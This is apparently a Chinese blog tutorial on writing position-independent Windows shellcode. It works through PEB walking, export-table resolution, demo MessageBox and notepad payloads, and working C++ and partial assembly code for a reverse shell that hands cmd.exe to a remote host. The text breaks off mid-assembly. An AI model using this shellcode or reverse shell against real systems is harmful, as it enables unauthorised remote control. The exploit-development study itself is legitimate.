# 一步步学写Windows下的Shellcode
**摘要：**
在C语言中，调用一个函数，编写者无需关心函数地址是如何获取的，所有的操作IDE在进行链接的时候帮助我们完成了。但是在shellcode中，这些操作都需要我们自己去完成，理解PE结构，理解函数表，这些都是shellcode编写最有魅力的一部分。

本文的逻辑首先是从C代码着手，学习如何使用汇编重现的基础，编写一个无移植性的shellcode作基础引导。在掌握了硬编码编写之后，通过掌握获取函数导出表，编写能够在所有Windows版本上运行的通用shellcode。

这篇文章时间跨度比较久远，起笔还是暑假在贵阳的时候，后来做了一段时间WEB安全，这篇文章便写了一小半就烂尾了。后来投入到Win/Browser下漏洞的怀抱中（最近又回Ubuntu了，渣男。出戏：陆司令：何书桓！你在我的两个女儿之间跳来跳去，算什么东西！），需要在WIN7下做一些自定义shellcode，自己之前自定义的shellcode居然无法在WIN7下运行，于是想起这篇未完工的文章，借此对shellcode编写做一次总结与复习。
##创建自己的SC实验室

当我们创建自己的shellcode实验室时候，我们必须清楚无论是自己编写的，亦或者是网络上获取的shellcode，我们都需要对其的行为有一个深刻的了解。

首先是安全性，要做的就是在一个相对安全的环境下进行测试（例如虚拟机），以保证不会被黑吃黑。

其次，这个测试方法要足够方便。不能将shellcode随意的扔到自己写的Exploit中进行测试，因为大多数Exploit对shellcode的格式要求是非常严格的，尤其是栈溢出方面的漏洞。初期编写的shellcode可能包含大量Null字节，容易被strcpy截断。（比如笔者写的shellcode基本都通不过栈溢出的测试。。汗，一般直接扔到Browser的Exploit里）

下面是我们的shellcode调试环境，如果是WIN7以后的版本需要将DEP选项关闭。

***Shellcode-lab***

调试一段shellcode  
环境：windows xp sp0  
编译器：VC++6.0

```
 char shellcode[]="xfcxe8x82x00x60x89xe5x31xc0x64x8bx50x30"
"x8bx52x0cx8bx52x14x8bx72x28x0fxb7x4ax26x31xff"
"xacx3cx61x7cx02x2cx20xc1xcfx0dx01xc7xe2xf2x52"
"x57x8bx52x10x8bx4ax3cx8bx4cx11x78xe3x48x01xd1"
"x51x8bx59x21xd3x8bx49x18xe3x3ax49x8bx34x8b"
"x01xd6x31xffxacxc1xcfx0dx01xc7x38xe0x75xf6x03"
"x7dxf8x3bx7dx24x75xe4x58x8bx58x24x01xd3x66x8b"
"x0cx4bx8bx58x1cx01xd3x8bx04x8bx01xd0x89x44x24"
"x24x5bx5bx61x59x5ax51xffxe0x5fx5fx5ax8bx12xeb"
"x8dx5dx6ax01x8dx85xb2x00x50x68x31x8bx6f"
"x87xffxd5xbbxf0xb5xa2x56x68xa6x95xbdx9dxffxd5"
"x3cx06x7cx0ax80xfbxe0x75x05xbbx47x13x72x6fx6a"
"x00x53xffxd5x6ex6fx74x65x70x61x64x2ex65x78x65"
"x00";


int main(int argc,char **argv)
{
    /*方法一 VC++6.0 error报错*/
    /*
    int(*func)(); //创建一个函数指针func
    func=(int (*)())shellcode; //将shellcode的地址赋值给func
    (int)(*func)();//调用func
    */
/*方法二 asm*/
    __asm
    {
        lea eax,shellcode//将shellcode地址赋值给eax
        push eax//将eax入栈
        ret//跳转到eax地址
    }
//PS:第二种方法只有关闭NX/DEP才行（XP下就没有这个问题）
}

```

##  从C到shellcode

shellcode大多是包含很多恶意行为的代码，就如它名字由来的那样 “获取shell的代码”。

但是在漏洞大多数复现中，我们需要做的仅仅是证明自己能够利用，所以我们编写的shellcode需要满足无害性和可见性。例如弹出一个计算器，或者如下面的C代码一样，让Exploit弹出一个极具个人风格的MessageBox也是一个不错的选择。

C实现非常简单，只需要调用MessageBox函数，写入参数。

```
#include<windows.h>
int main(int argc,char** argv)
{
​    MessageBox(NULL,"You are hacked by Migraine!","Pwned",MB_OK);
}

```

[![](_v_images/20191226140448715_30866.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%992319.png)

放入IDA，查找到Main函数的位置。  
可以查看反汇编，四个参数分别PUSH入栈，然后调用MessageBoxA  
MSDN对MessageBox的描述

```
int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaptioUINT uType );

```

[![](_v_images/20191226140448010_20779.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%992472.png)

在OD中下断点调试，得到同样的结果。

[![](_v_images/20191226140447003_27883.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%992493.png)

基于调试可知，MessageBoxA从USER32.DLL加载到内存的地址为0x77D3ADD7  
当然这个地址是非常不稳定的，受到操作系统版本还有很多因素(例如ASLR)的影响  
不过为了简便shellcode，目前将这部分先放一放。

[![](_v_images/20191226140446398_24596.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%992613.png)

在我们编写的另一个程序中（见下文），发现这个函数依旧被映射到了同一个位置  
因为XP没有开启ASLR的缘故，DLL加载的基地址不会变化  
值得注意的是该程序需要调用USER32.DLL，否则需要手动LoadLibrary

[![](_v_images/20191226140445394_14204.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%992725.png)

但是现在这段C生成的代码，直接提取字节码是行不通的。  
函数的参数被放在了该程序的Rodata段中调用，与地址无关的段。  
而我们要求shellcode能在任何环境下运行，需要保证参数可控，即需要将参数入栈，然后再调用。

接下来用汇编重写一遍（C嵌入asm）  
通过自己将数据入栈，然后调用MessageBoxA

```
#include<windows.h>
void main()
{
    LoadLibrary("user32.dll");//Load DLL
    __asm
    {    
        push 0656e;ne
        push 0x69617267;grai
        push 0x694d2079;y Mi
        push 0x62206565;ed b
        push 0x6b636168;hack
        push 0x20657261;Are
        push 0x20756F59;You
        mov ebx,esp
        push 
        push 0x656e6961;aine
        push 0x7267694d;Migr
        mov ecx,esp

        //int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,UINT uType );
        xor eax,eax
        push eax//uTyoe->0
        push ecx//lpCaption->Migraine
        push ebx//lpText->You are hacked by Migraine
        push eax//hWnd->0
        mov esi,0x77D3ADD7//User32.dll->MessageBoxA
        call esi 

    }
}

```

[![](_v_images/20191226140444789_27714.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%993486.png)

将ASM提取字节码

再OD中查看这一段ASM

[![](_v_images/20191226140444285_26120.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%993512.png)

使用UltraEditor查看16进制字节码，然后找到我们的ASM，复制便成功提取了我们的shellcode

[![](_v_images/20191226140443679_18060.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%993569.png)

[![](_v_images/20191226140442974_26957.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%993571.png)

```
68 6E 65 00 00 68 67 72 61 69 68 79 20 4D 69 68
65 65 20 62 68 68 61 63 6B 68 61 72 65 20 68 59
6F 75 20 8B DC 6A 00 68 61 69 6E 65 68 4D 69 67
72 8B CC 33 C0 50 51 53 50 BE D7 AD D3 77 FF D6
5F 5E 5B 83 C4 40 3B EC E8 97 3B FF FF

```

调整一下格式，便获取到了shellcode

```
char shellcode[]="x68x6Ex65x00x68x67x72x61x69x68x79x20x4Dx69x68"
"x65x65x20x62x68x68x61x63x6Bx68x61x72x65x20x68x59"
"x6Fx75x20x8BxDCx6Ax00x68x61x69x6Ex65x68x4Dx69x67"
"x72x8BxCCx33xC0x50x51x53x50xBExD7xADxD3x77xFFxD6"
"x5Fx5Ex5Bx83xC4x40x3BxECxE8x97x3BxFFxFF";

```

放入上文搭建的shellcode调试环境，添加LoadLibrary(“user32.dll”);以及头文件#include<windows.h>

在WInodws xp下运行效果理想

[![](_v_images/20191226140442570_934.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%994261.png)

### 优化shellcode

去除null字节

这里使用xor配合sub就能够完全去除null，还有一些其他方法，使用16位寄存器避免null字节，在《exploit编写教程》上面都有详细的介绍，就不再重复造轮子了。

```
__asm
​    {    
/*使用sub来替换/x00*/
​        mov eax,0x1111767f
​        sub eax,0x11111111
​        push eax
​        //push 000656e;ne
​        push 0x69617267;grai
​        push 0x694d2079;y Mi
​        push 0x62206565;ed b
​        push 0x6b636168;hack
​        push 0x20657261;Are
​        push 0x20756F59;You
​        mov ebx,esp
/*使用xor来替换/x00*/
​        xor eax,eax
​        push eax
​        //push 
​        push 0x656e6961;aine
​        push 0x7267694d;Migr
​        mov ecx,esp
​        //int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,UINT uType );
​        xor eax,eax
​        push eax//uTyoe->0
​        push ecx//lpCaption->Migraine
​        push ebx//lpText->You are hacked by Migraine
​        push eax//hWnd->0
​        mov esi,0x77D3ADD7//User32.dll->MessageBoxA
​        call esi 
​    }

```

此时生成的shellcode就不存在x00了

[![](_v_images/20191226140441663_7464.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%995041.png)

##  编写更稳定Shellcode

如何提高shellcode 的可移植性一直是一个需要我们在一的问题。

前文我们编写的MessageBoxA的地址是硬编码的，导致这段shellcode只能利用于windows xp sp0。

但是Windows并不支持像Linux那样的int 0x80中断呼叫函数的操作，于是唯一的方法就是通过PE文件中的函数导出表获取函数此刻的地址，这个方法在提高可移植性的同时，还可以一劳永逸地解决ASLR带来的地址偏移问题。

###   动态定位kernel32.dll

不同版本的操作系统，kernel32.dll的基地址也是不同的。Windows没有linux那样方便的中断机制来调用系统函数，所以只能通过基址+偏移地址来确定函数的位置。

通过PEB获得基址

我们可以通过Windbg解析PEB（WindowsXP符号表已经不再支持自动下载）

所以手动下载安装WindowsXP-KB936929-SP3-x86-symbols-full-ENU.exe

但是碰到一些问题，所以在Windows10下用Windbg(x86)进行PEB分析

使用windbg加载任意一个x86程序，会出现break，等待到出现int 3即可进行操作

[![](_v_images/20191226140441057_29584.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%995576.png)

!peb可以自动分析，可以查询到KERNEL32.DLL的地址。

[![](_v_images/20191226140440451_4134.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%995611.png)

PEB是进程环境块，由TEB线程环境块偏移0x30字节。我们这里需要直到查找地址的原理。  
大概流程是通过FS段选择器找到TEB，通过TEB找到PEB，然后获取kernel和ntdll的地址。  
接下来我们在windbg中，来手工实现PEB结构分析，之后会使用汇编完成Kernel基址的读取。  
查看PEB结构

[![](_v_images/20191226140439747_3651.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%995767.png)

直接查看LDR结构

[![](_v_images/20191226140438941_31264.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%995780.png)

偏移0xc，选择InLoadOrderModuleList  
查看这个\_LIST\_ENTRY结构

[![](_v_images/20191226140438233_7195.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%995830.png)

\_LIST\_ENTRY 是一个存放双向链表的数据结构（包含于\_LDR\_DATA\_TABLE\_ENTRY）  
\_LDR\_DATA\_TABLE\_ENTRY是存放载入模块信息的结构，并且是由\_LIST\_ENTRY这个双向链表串联起来。  
由三种串联方式，区别仅在于排列顺序（上文我们偏移0x14选择InMemoryOrderModuleList ）

```
   +0c InLoadOrderModuleList : _LIST_ENTRY [ 0x51c00 - 0x78f6b88 ]
   +14 InMemoryOrderModuleList : _LIST_ENTRY [ 0x51c08 - 0x78f6b90 ]
   +1c InInitializationOrderModuleList : _LIST_ENTRY [ 0x51c90 - 0x78f6b98 ]

```

第一个\_List\_ENTRY指向的地址是0x51c08(因为InMemoryOrderModuleList的指针指向的是下一个结构的InMemoryOrderModuleList，而不是\_LDR\_DATA\_TABLE\_ENTRY的结构头，需要偏移0x8)

[![](_v_images/20191226140437729_30165.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%996352.png)

查看对应的\_LDR\_DATA\_TABLE\_ENTRY结构，得知这是iexplore.exe(调试的宿主程序)的基地址为1120000（DLLBase）

接下来顺着LIST_ENTRY,往下寻找结点。发现kernel在第三个结点。

[![](_v_images/20191226140436722_12221.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%996472.png)

查看这个地址的\_LDR\_DATA\_TABLE\_ENTRY结构  
通过这两次观察，可以发现，实际上这个结构体的第一个结构就是\_List\_ENTRY,负责将这些\_LDR\_DATA\_TABLE\_ENTRY结构串联成链表。  
偏移0x18可以得出DllBase为0x77e10000

[![](_v_images/20191226140435816_12199.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%996611.png)

成功获取Kernel的基地址。  
用接下来用汇编实现kernel地址的读取  
原理是在InMemoryOrderModuleList结构中，kernel位置固定为第三个。

```
global CMAIN
CMAIN:
mov ebp, esp; for correct debugging
xor ebx,ebx

mov ebx,[fs:0x30] ;TEB+0x30->PEB
mov ebx,[ebx+0xc] ;PEB+0xc->LDR
mov ebx,[ebx+0x14] ;LDR+0x14->InMemoryOrderModuleList-->_LIST_ENTRY第一个节点->??.dll
mov ebx,[ebx] ;-->_LIST_ENTRY第二个节点->ntdll.dll
mov ebx,[ebx] ;-->_LIST_ENTRY第三个节点->Kernel.dll
mov ebx,[ebx+0x10]; DllBase偏移0x18减去指向偏移0x8;下文会详细分析
xor eax, eax
ret

```

使用SASM调试，在结尾下断点，发现ebx已经成功赋值为了kernel的地址，与windbg显示的一致。（此处的汇编代码是之前在另一台机器上做的实验，所以kernel地址不同，希望不要引起争议）

使用命令!peb

[![](_v_images/20191226140434911_18580.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%997182.png)

[![](_v_images/20191226140434107_25560.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%997184.png)

如果需要在VS下编译，也可采用内联汇编实现。

```
int _tmain(int argc, _TCHAR* argv[])
{
​    int kernel32=0;
​    _asm{
​    xor ebx,ebx
​    mov ebx,fs:[0x30]
​    mov ebx,[ebx+0xc]
​    mov ebx,[ebx+0x14]
​    mov ebx,[ebx];ntdll
​    mov ebx,[ebx];kernel
​    mov ebx,[ebx+0x10];DllBase
​    mov kernel32,ebx
​    }
​    printf("kernel32=0x%x",kernel32);
​    getchar();
​    return 0;
}

```

上述代码中（SASM），比较需要注意的第15行为ebx+0x10而不是0x18（\_LDR\_DATA\_TABLE\_ENTRY结构中标准的DllBase偏移）  
主要原因是InMemoryOrderLinks的指针指向的是下一个\_LDR\_DATA\_TABLE\_ENTRY的InMemoryOrderLinks（结构偏移8），所以需要该地址减去-0x8才是正确的文件头（图中案例0x954dd0-0x8）  
所以当ebx存放InMemoryOrderLinks的指针时，要获取DllBase需要偏移0x18-0x8=0x10

[![](_v_images/20191226140433001_30751.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%997758.png)

至此我们已经获取到了kernel32.dll的基地址，获取这个地址的方法还有很多方法，使用SEH、TEB都可以间接获取Kerne32的地址，如果有需要可以参考《Exploit编写系列教程》。还有需要注意的是不同系统下，某些获取方法可能会失效，这次实验的测试环境（Win7）下的寻址就和之前的系统有一些不同，所以可能不会向前兼容，不过通过windbg对单个系统进行符号调试，是很容易发现区别的并且修改方案。

###  获取函数地址

在理解这部分之前，我们首先需要对PE格式有一定的了解。就从我们刚才获取了基地址的Kernel32作为基础，一步步看如何获取系统API函数的地址。

首先从DOS头开始，Windbg能够使用符号表来对地址进行解析。  
解析\_IMAGE\_DOS\_HEADER结构，我们只需要了解e\_lfanew字段，指向PE头，该字段在在DOS头偏移0x3c的位置。

[![](_v_images/20191226140432496_18691.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998148.png)

之前的kernel基址加上e_lfanew字段的偏移（0n开头表示十进制）是指向PE头的指针。

[![](_v_images/20191226140431390_31132.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998198.png)

获取了PE头指针，我们即可以使用windbg解析PE头的\_IMAGE\_NT_HEADERS结构  
\_IMAGE\_FILE_HEADER 是一个结构体，包含代码数目、机器类型以及特征等信息。  
而我们这里需要使用的结构体是\_IMAGE\_OPTIONAL_HEADER

[![](_v_images/20191226140430583_28578.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998331.png)

继续利用windbg分析，经过两次分析，现在的读者应该也已经轻车熟路了。

分析\_IMAGE\_OPTIONAL_HEADER，其包含以下几个信息。

很显然，偏移0x60的DataDirectory段就是函数导出表的偏移。

```
AddressOfEntryPoint：exe/dll 开始执行代码的地址，即入口点地址。 
ImageBase：DLL加载到内存中的地址，即映像基址。 
DataDirectory-导入或导出函数等信息。

```

[![](_v_images/20191226140430079_8920.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998550.png)

继续解析这个结构，终于获取到了这个结构到VA。

因为我们之前的解析都没有用到指针，所以可以一起算VA偏移PE头一共0x78字节（240是PE偏移DOS，是动态获取）

[![](_v_images/20191226140428573_17892.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998636.png)

获取到DATA DIRECTORY结构到VirtualAddress地址  
我们关心的主要有三个数组结构

```
AddressOfFunctions：指向一个DWORD类型的数组，每个数组元素指向一个函数地址。 
AddressOfNames：指向一个DWORD类型的数组，每个数组元素指向一个函数名称的字符串。 
AddressOfNameOrdinals：指向一个WORD类型的数组，每个数组元素表示相应函数的排列序号

```

[![](_v_images/20191226140428069_15913.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998847.png)

AddressOfNames的结构是一个数组指针，每个机器位（4字节）都指向一个函数名的字符串。  
所以我们可以通过遍历这个数组，结合字符串匹配获取到该函数的序号。

[![](_v_images/20191226140427363_24348.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%998931.png)

AddressOfNameOrdinals存放这对应函数的索引值，在获取了函数的序号之后，按照序号查找函数索引值。  
需要注意的是每个索引值占2字节。  
例如第三个函数ActivateActCtx函数的索引值为4

[![](_v_images/20191226140426056_2279.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%999038.png)

AddressOfFunctions则根据索引排序，存放着函数的地址。  
地址加上0x10\[索引4字节*指针4字节\]存放ActivateActCtx函数的偏移地址。

[![](_v_images/20191226140425151_26767.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%999123.png)

我们使用汇编来实现这一过程，接着上面的汇编代码，此时的EBX存放Kernel32的地址。

```
;从Kernel32的PE头，获取DATA DIRECTORY的地址
        ;Get address of GetProcessAddress
        mov edx,[ebx+0x3c] ;DOS HEADER->PE HEADER offset
        add edx,ebx ;PE HEADER 
        mov edx,[edx+0x78] ;EDX=DATA DIRECTORY
        add edx,ebx ;EDX=DATA DIRECTORY
;将字符串与AddressOfNames    数组匹配，获得函数的序号
        ;compare string 
        xor ecx,ecx
        mov esi,[edx+0x20]
        add esi,ebx

Get_Func:
        inc ecx
        lodsd ;mov eax,esi;esi+=4
        add eax,ebx;
        cmp dword ptr[eax],0x50746547 ;GetP
        jnz Get_Func
        cmp dword ptr[eax+0x4],0x41636f72;proA
        jnz Get_Func
        cmp dword ptr[eax+0x8],0x65726464 ;ddre
        jnz Get_Func
    ;通过序号在AddressOfNameOrdinals中获取索引    
        ;get address
        mov esi,[edx+0x24] ;AddressOfNameOrdinals
        add esi,ebx
        mov cx,[esi+ecx*2];num
        dec ecx 
;通过索引在AddressOfFunctions中获取函数地址，存放于EDX
        mov esi,[edx+0x1c];AddressOfFunctions
        add esi,ebx
        mov edx,[esi+ecx*4] 
        add edx,ebx ;EDX = GetProcAddress

```

此时我们已经获取了GetProcAddress函数的地址，所有关于PE文件的内容到这里也就结束了，之后我们就可以想C语言一样非常容易地调用一个函数。我们已经度过了编写shellcode最黑暗的过程，接下来迎接着我们的将是一条康庄大道。

通过GetProcAddress，我们首先可以使用获取LoadLibrary函数的地址，该函数可以用来加载user32模块，同时获取其基地址。这部分就比较简单了，直接贴代码。

```
;Get LoadLibrary
        xor ecx,ecx
        push ebx ;Kernel32 入栈备份
        push edx ;GerProcAddress 入栈备份
        push ecx ;0
        push 0x41797261 ; aryA
        push 0x7262694c ; Libr
        push 0x64616f4c ; Load 
        push esp;"LoadLibraryA"
        push ebx ;
        call edx ;GerProcAddress(Kernel32,"LoadLibraryA")

        add esp,0xc ;pop "LoadLibraryA"
        pop ecx; ECX=0
        push eax ;EAX=LoadLibraryA
        push ecx
        mov cx, 0x6c6c  ; ll
        push ecx
        push 0x642e3233 ; 32.d
        push 0x72657375 ; user
        push esp        ; "user32.dll"
        call eax        ; LoadLibrary("user32.dll")

```

到这里，有一定汇编和WIN32基础的读者已经可以编写shellcode逻辑了，思路即通过GetPrcAddress函数获取需要的函数地址，能结合完成各项功能，剩下的部分就需要读者发挥自己天才的想象力了。

文末会提供一个完整编写的shellcode作为案例。

##  三种经典的shellcode形式

Shellcode在功能性上的实现，主要分为以下三大类  
分别是下载恶意文件执行、程序本身捆绑文件还有直接反弹shell获得控制权  
在内核层面则还有提权等操作，这里只对应用层shellcode功能实现做一个归类。

###  下载执行

调用URLDownloadToFile函数下载恶意文件到本地，并且使用Winexec执行  
函数原型

```
HRESULT URLDownloadToFile( 
LPUNKNOWN pCaller, 
LPCTSTR szURL, 
LPCTSTR szFileName, 
_Reserved_ DWORD dwReserved, 
LPBINDSTATUSCALLBACK lpfnCB 
);

```

###  捆绑

通过GetFileSize获取文件句柄，获取释放路径（GetTempPathA），设置好文件指针（SetFilePoint），使用VirtualAlloc在内存中申请一块内存，再将数据读取（ReadFile）写入到本地文件（CreateFIle WriteFile），最后在对该文件执行。

###  反弹shell

反弹shell属于无文件攻击，使用socket远程获得对方的cmd.exe。优点是不容易留下日志，适合渗透测试中使用，缺点也很明显，维持连接的稳定性较差。

在Windows下实现反弹shell，比Linux多了一个步骤，启动或者初始化winsock库，之后创建cmd.exe进程然后TCP连接端口/打开监听方法都是相近的。

需要注意的使用C编程可以使用Socket结合双管道进行通信，但是用汇编管道编写比较麻烦。不建议使用管道来进行通信。解决方案是使用WSASocket代替Socket，这个函数支持IO重叠。

函数原型

```
SOCKET WSASocket (
　　int af, 
　　int type, 
　　int protocol, 
　　LPWSAPROTOCOL_INFO lpProtocolInfo, 
　　GROUP g, 
　　DWORD dwFlags 
　　);

```

这里我们主要针对第三种功能，实现一个无管道的反弹shell代码。  
因为篇幅较长，这里使用C++实现，接下来只需要用汇编调用函数实现即可。  
本部分参考博客：[https://blog.csdn.net/PeterZ1997/article/details/79448916](https://blog.csdn.net/PeterZ1997/article/details/79448916)

[![](_v_images/20191226140424446_3795.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%9911988.png)

实现环境

> WIN7 SP1  
> VS2010

首先实现一个TCP连接，使用nc做连接测试。

WSASocket的使用与Socket基本一致，多出来的参数设置为NULL即可。

包含头文件WinSock2.h和winsock.h

```
//初始化WSA套接字
WSADATA wsd;
    WSAStartup(202,&wsd);
    SOCKET socket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    SOCKADDR_IN sin;
    sin.sin_addr.S_un.S_addr=inet_addr(REMOTE_ADDR);
    sin.sin_port=htons(REMOTE_PORT);
    sin.sin_family=AF_INET;
//连接远程的服务端，发送验证代码
    connect(socket,(sockaddr*)&sin,sizeof(sin));
    send(socket,"[+]Hello!n",strlen("[+]Hello!n"),0);

接下来将使用CreateProcess为cmd.exe创建子进程，然后将标准输入、标准输出、标准错误输出都绑定到socket上。（这部分在Linux下实现比起Windows就简单多了，可以直接重定向）
//创建cmd进程
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    GetStartupInfo(&si);
    si.cb=sizeof(STARTUPINFO);
    si.hStdInput=si.si.hStdOutput=si.hStdError=(HANDLE)socket; //将标准输入输出绑定到Socket
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow=SW_HIDE;
    TCHAR cmdline[255]=L"cmd.exe";
    while(!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)){ //创建进程，第五个参数TRUE子进程继承父进程的所有句柄
    Sleep(1000);
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

```

在汇编编写中，可以讲首先计算出关键函数和DLL的基地址并且放入栈帧，方便随时调用。

socket类的函数（WSAStartup、connect）如果执行成功EAX会返回0，如果失败会返回-1（0xFFFFFFFF）

以上程序实现函数的来源

***Kernel32.dll***

```
CreateProcessA
GetStartupInfoA
LoadLibraryA

```

***ws2_32.dll***

```
WSAStartup
WSASocketA
connect

```

使用汇编编写

初始化部分（代码量较大，仅做参考，速读的读者可以暂时跳过这部分）

```
nop
        nop
        nop
        ;get the address of kernel32.dll
        xor ecx,ecx
        mov eax,fs:[0x30];EAX=PEB
        mov eax,[eax+0xc];EAX=PEB->LDR
        mov esi,[eax+0x14];ESI=PEB->Ldr.lnMemOrder
        lodsd     ;mov eax,[esi];esi+=4;EAX=SecondMod->ntdll
        xchg eax,esi 
        lodsd    ;EAX=ThirdMod->kernel
        mov ebx,[eax+0x10] ;EBX=kernel->DllBase

        ;Get address of GetProcessAddress
        mov edx,[ebx+0x3c] ;DOS HEADER->PE HEADER offset
        add edx,ebx ;PE HEADER 
        mov edx,[edx+0x78] ;EDX=DATA DIRECTORY
        add edx,ebx ;EDX=DATA DIRECTORY

        ;compare string 
        xor ecx,ecx
        mov esi,[edx+0x20]
        add esi,ebx

Get_Func:
        inc ecx
        lodsd ;mov eax,esi;esi+=4
        add eax,ebx;
        cmp dword ptr[eax],0x50746547 ;GetP
        jnz Get_Func
        cmp dword ptr[eax+0x4],0x41636f72;proA
        jnz Get_Func
        cmp dword ptr[eax+0x8],0x65726464 ;ddre
        jnz Get_Func

        ;get address
        mov esi,[edx+0x24] ;AddressOfNameOrdinals
        add esi,ebx
        mov cx,[esi+ecx*2];num
        dec ecx 
        mov esi,[edx+0x1c];AddressOfFunctions
        add esi,ebx
        mov edx,[esi+ecx*4] 
        add edx,ebx ;EDX = GetProcessAddress

;EDX=GetProcAddr
;EBX=kernel32

        ;get CreateProcess address
        xor ecx,ecx
        push ebx ;Kernel32
        push edx;GetProcAddr
        mov cx,0x4173;sA
        push ecx ;sA
        push 0x7365636F;oces
        push 0x72506574;tePr
        push 0x61657243;Crea
        push esp ;"CreateProcessA"
        push ebx
        call edx;GetProcAddr("CreateProcessA")

        add esp,0x10 ;clean stack
        push eax ;CreateProcessA

        ;CreateProcessA <--esp
        ;GetProcAddr <-- esp+4
        ;Kernel32 <--esp+8

        //mov ebx,[esp+8];Kernel32
        mov edx,[esp+4];GetProAddr

        ;get GetStartupInfo address
        mov ecx,0x416F66
        push ecx;foA
        push 0x6E497075;upIn
        push 0x74726174;tart
        push 0x53746547;GetS
        push esp
        push ebx ;Kernel32
        call edx ;GetProAddresss("GetStartupInfoA")


        add esp,0x10;clean stack
        push eax ;GetStartupInfoA
        mov edx,[esp+8];GetProAddr
        ;Get LoadLibrary
        xor ecx,ecx
        push ecx ;0
        push 0x41797261 ; aryA
        push 0x7262694c ; Libr
        push 0x64616f4c ; Load 
        push esp;"LoadLibraryA"
        push ebx ;
        call edx ;GerProcAddress("LoadLibraryA")



        add esp,0xc ;pop "LoadLibraryA"
        pop ecx; ECX=0
        push eax ;EAX=LoadLibraryA
        mov cx,0x3233 ; 32
        push ecx;
        push 0x5F327377 ; ws2_
        push esp        ; "ws2_32"
        call eax        ; LoadLibrary("ws2_32.dll")


        ;MessageBoxA address
        add esp,0x8 ;pop "ws2_32.dll"
        push eax
        ;ws2_32.dll <--esp
        ;LoadLibraryA <--esp+4
        ;GetStartupInfoA <--esp+8
        ;CreateProcessA <--esp+0c
        ;GetProcAddr <-- esp+0x10
        ;Kernel32 <--esp+0x14



        mov edx,[esp+0x10] ;GetProcAddress
        xor ecx,ecx
        mov cx,0x7075;up
        push ecx
        push 0x74726174;tart
        push 0x53415357 ;WSAS
        push esp                       ;"WSAStartup"
        push [esp+0x10];ws2_32.dll
        call edx;GetProcAddress("WSAStartup")

        add esp,0xc 
        push eax;WSAStartup

        mov edx,[esp+0x14] ;GetProcAddress
        mov ebx,[esp+4];ws2_32.dll
        xor ecx,ecx
